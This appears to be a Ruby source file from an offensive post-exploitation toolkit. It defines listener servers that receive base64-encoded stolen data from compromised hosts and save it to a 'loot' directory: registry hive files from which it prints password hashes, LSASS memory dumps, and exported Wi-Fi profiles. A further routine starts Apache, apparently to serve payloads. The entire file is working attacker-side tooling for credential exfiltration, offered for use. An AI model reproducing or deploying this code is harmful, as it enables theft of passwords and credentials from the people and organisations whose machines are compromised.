#!/usr/bin/env ruby
require 'socket'
require_relative 'core'
include MainCommands
class ServerSetUp
  def get_host
    host_name = [(get_input('Enter the host ip to listen on: ') ), $stdin.gets.rstrip][1]
    ip = host_name.split('.')
    if ip[0] == nil or ip[1] == nil or ip[2] == nil or ip[3] == nil 
      print_error("Not a valid IP\n") 
      get_host()
    end 
    print_success("Using #{host_name} as server\n")
    return host_name
  end
  def get_port
    port = [(get_input('Enter the port you would like to use or leave blank for [443]: ') ), $stdin.gets.rstrip][1]
    if port == ''
      port = '443'
      print_success("Using #{port}\n")
      return port
    elsif not (1..65535).cover?(port.to_i)
      print_error("Not a valid port\n")
      sleep(1)
      port()
    else 
      print_success("Using #{port}\n")
      return port
    end
  end
  def hash_server(port)
    print_info("Starting Server!\n")
    server = TCPServer.open(port.to_i)
    x = 0
    loop{
      Thread.start(server.accept) do |client|
        file_name = client.recv(1024)
        print_success("Got #{file_name.strip} file!\n")
        print_info("Getting Data!\n")
        out_put = client.gets()
        print_info("Writing to File\n")
        File.open("#{loot_dir}#{file_name.strip}#{x}", 'w') {|f| f.write(Base64.decode64(out_put))}
        print_success("File Done!\n")
        print_info("Trying to print Hashes!\n")
        Dir.mkdir(loot_dir) if not Dir.exists?(loot_dir)
        print_hashes(x)
        x += 1 if file_name == "sys\r\n"
      end
    }
    rescue => error
      print_error(error)
  end
  def lsass_server(port)
    print_info("Starting Server!\n")
    server = TCPServer.open(port.to_i)
    x = 0
    loop{   
      Thread.start(server.accept) do |client|
        file_name = client.recv(1024) 
        print_success("Got #{file_name.strip} file!\n")
        print_info("Getting Data\n")
        out_put = client.gets()
        print_info("Writing to File\n")
        File.open("#{loot_dir}#{file_name.strip}#{x}.dmp", 'w') {|f| f.write(Base64.decode64(out_put))}
        print_success("File Done!\n")
        x += 1
      end   
    }
    rescue => error
    print_error(error)
  end
  def wifi_server(port)
    print_info("Starting Server!\n")
    server = TCPServer.open(port.to_i)
    loop{
      Thread.start(server.accept) do |client|
        file_name = client.recv(1024)
        print_success("Got #{file_name.strip} file!\n")
        print_info("Getting Data\n")
        out_put = client.gets()
        print_info("Writing to File\n")
        File.open("#{file_name.strip}.xml", 'w') {|f| f.write(Base64.decode64(out_put))}
        print_success("File Done!\n")
      end
    }
  rescue => error
    print_error(error)
  end
  def web_server
    print_info("Checking for Apache\n")
    sleep(2)
    if File.exists?('/usr/sbin/apache2')
      if File.exist?('/usr/sbin/service')
        @service_check = `service apache2 status`
      else
        print_error("Can't Find Startup Service")
        exit
      end
    elsif File.exists?('/usr/sbin/apachectl')
      if File.exists?('/usr/bin/systemctl')
        @systemd_check = `systemctl status httpd`
      else
        print_error("Can't Find Startup Service")
        exit
      end
    else
      print_error("Can't Find Apache!\n")
      exit
    end
    if @systemd_check =~ /inactive/ or @service_check =~ /NOT running/
      print_info("Starting Server\n")
      if File.exist?('/usr/bin/systemctl')
        out_put = `systemctl start httpd 2>&1`
        if out_put =~ /Access denied/
          print_error("Access Denied, Not Running as Root\n")
          exit
        else
          print_success("Server Started!\n")
          sleep(2)
        end
      elsif File.exist?('/usr/sbin/service')
        out_put = `service apache2 start`
        print_success("Server Started!\n")
        sleep(2)
      else
        print_error("Could Not Start Apache!\n")
        exit
      end
    elsif @systemd_check =~ /active/ or @service_check =~ /running/
      print_info("Server Already Running!\n")
      sleep(2)
    end 
    rescue => error
      print_error("#{error}\n")
      exit
  end
  trap("INT") do
    print_info("Caught CTRL-C stopping server!\n")
    exit
  end
end